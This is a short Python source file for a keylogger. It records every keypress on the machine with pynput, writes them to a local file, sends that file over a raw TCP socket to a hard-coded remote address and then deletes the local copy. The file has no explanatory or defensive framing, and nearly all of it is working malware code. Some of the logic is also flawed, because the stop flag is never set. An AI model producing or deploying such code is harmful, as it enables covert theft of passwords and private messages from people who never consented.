import ctypes
import socket
import os
import sys
from threading import Thread, Lock
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.filename = 'keylogs.txt'
        self.file_lock = Lock()
        self.server_addr = ('192.168.122.182', 9000)
        self.stop_logging = False

    def on_press(self, key):
        if self.stop_logging:
            return False
        with self.file_lock:
            try:
                with open(self.filename, 'a') as f:
                    f.write('{}\n'.format(str(key)))
                print('Key pressed: {}'.format(key))
            except Exception as e:
                print('Error writing to file: {}'.format(e))
        return True

    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            while not self.stop_logging:
                pass
        self.send_logs()

    def send_logs(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(self.server_addr)
            with self.file_lock:
                with open(self.filename, 'r') as f:
                    data = f.read()
                    s.sendall(data.encode())
        except Exception as e:
            print('Error sending logs to server: {}'.format(e))
        finally:
            os.remove(self.filename)
            s.close()

if __name__ == '__main__':
    keylogger = Keylogger()
    Thread(target=keylogger.start_logging).start()